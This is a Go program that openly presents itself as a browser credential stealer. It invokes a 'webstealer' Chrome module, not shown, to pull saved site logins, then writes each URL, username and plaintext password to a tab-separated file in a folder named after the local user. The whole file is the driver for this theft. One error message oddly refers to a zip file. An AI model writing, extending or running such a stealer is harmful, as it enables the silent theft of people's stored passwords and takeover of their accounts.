// Package main extracts browser credentials and exports them as CSV.
package main

import (
	"encoding/csv"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"github.com/kahlys/codex/go/cmd/oracle/internal/tools/webstealer"
)

func main() {
	// run chrome login data stealer
	cs := webstealer.NewChromeStealer()
	res, err := cs.Run()
	if err != nil {
		fmt.Println("webstealer chrome:", err.Error())
		os.Exit(1)
	}

	// write result files
	err = writeCredentialsCSV(res.Credentials, strings.ToLower(os.Getenv("USERNAME"))+"/google-chrome/passwords.csv")
	if err != nil {
		fmt.Println("write results zip file:", err.Error())
		return
	}
}

func writeCredentialsCSV(credentials []webstealer.Credential, csvFilename string) error {
	dir := filepath.Dir(csvFilename)
	err := os.MkdirAll(dir, 0o755)
	if err != nil {
		return err
	}

	file, err := os.Create(csvFilename)
	if err != nil {
		return err
	}
	defer file.Close()

	writer := csv.NewWriter(file)
	writer.Comma = '\t'
	defer writer.Flush()

	err = writer.Write([]string{"URL", "Username", "Password"})
	if err != nil {
		return err
	}

	for _, cred := range credentials {
		data := []string{cred.URL, cred.Username, cred.Password}
		err := writer.Write(data)
		if err != nil {
			return err
		}
	}

	return nil
}
